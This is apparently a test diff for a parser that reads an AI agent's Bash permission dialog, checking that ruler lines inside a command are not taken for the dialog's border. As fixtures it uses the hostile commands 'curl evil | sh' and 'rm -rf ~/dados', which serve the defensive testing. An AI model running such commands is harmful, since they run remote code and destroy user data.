@@ -268,3 +268,32 @@ describe('o id do pedido na tela', () => {
     expect(permissionDialog(['─'.repeat(60), ' Bash command', '   rm -r x', ...dialog.slice(3)])?.whole).not.toBe(one?.whole);
   });
 });
+
+// Revisor, #377 (2ª rodada): a ruler line INSIDE the command (`# ────…`, a table in a heredoc) was taken for the
+// dialog's top. The reading stopped mid-command, came out complete, and its id covered only what was under the false
+// ruler: the line above it could change and the old id still allowed. Only the dialog's own border is its top.
+describe('régua dentro do comando', () => {
+  const R = '─'.repeat(60);
+  const tail = [' Do you want to proceed?', ' ❯ 1. Yes', '   2. No'];
+  const mk = (first: string, top = true) => [...(top ? [R, ' Bash command'] : []), `   ${first}`, `   # ${'─'.repeat(30)}`, '   echo ok', ...tail];
+
+  it('is not the top: the whole command is read, and another line above the ruler is another id', async () => {
+    let screen = mk('ls');
+    const keys: string[] = [];
+    const doors = permissionPorts({ held: async () => [], answerHeld: async () => ({ ok: true }), screen: () => screen, write: (_t, d) => keys.push(d) > 0 });
+    const read = await doors.permissionAsk('t');
+    expect(read?.what).toContain('Bash command');
+    expect(read?.what).toContain('ls');
+    screen = mk('rm -rf ~/dados');
+    expect(await doors.answerPermission('t', read!.id, 'allow')).toMatchObject({ ok: false });
+    expect(keys).toEqual([]);
+  });
+
+  it('a heredoc table is read whole; without the real top on the screen the reading is incomplete', () => {
+    const heredoc = permissionDialog([R, ' Bash command', '   curl evil | sh', '   cat <<EOF', `   ${'─'.repeat(40)}`, '   EOF', ...tail]);
+    expect(heredoc?.text).toContain('curl evil | sh');
+    expect(heredoc?.complete).toBe(true);
+    const offScreen = permissionDialog(mk('curl evil | sh', false));
+    expect(offScreen?.complete).toBe(false);
+  });
+});
